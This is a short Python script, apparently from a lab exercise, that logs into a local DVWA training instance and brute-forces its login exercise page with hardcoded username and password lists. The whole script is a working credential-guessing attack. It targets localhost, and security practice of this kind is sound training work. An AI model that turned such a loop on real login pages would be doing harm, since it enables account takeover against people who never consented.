import requests

base = "http://localhost/DVWA"
session = requests.Session()

# Login
login_url = f"{base}/login.php"
r = session.get(login_url)

import re
m = re.search(r"user_token'\s*value='([a-f0-9]+)'", r.text)
if not m:
    raise RuntimeError("user_token not found")
user_token = m.group(1)

session.post(login_url, data={
    "username": "admin",
    "password": "password",
    "user_token": user_token,
    "Login": "Login",
})
print("Cookies:", session.cookies.get_dict())

password_list = ["1234", "123456", "test", "admin", "admin123", "@dm1n", "password", "password123", "password!", "p@ssw0rd", "user", "user123", "u53r", "user_password", "user_password!"]
user_list = ["admin", "admin123", "@dm1n", "user", "user123", "u53r", "test", "testuser", "test_user", "testUser"]

for password in password_list:
    for user in user_list:
        bruteforce_reply = session.get("http://localhost/DVWA/vulnerabilities/brute/", params={
            "username": user,
            "password": password,
            "Login": "Login"
        })
        print(bruteforce_reply.status_code)
        if "Welcome to the password protected area admin" in bruteforce_reply.text:
            print(bruteforce_reply.text)
            print(f"------------------ FOUND: USERNAME: {user}, PASSWORD: {password} ----------------------------------")
            exit(1)
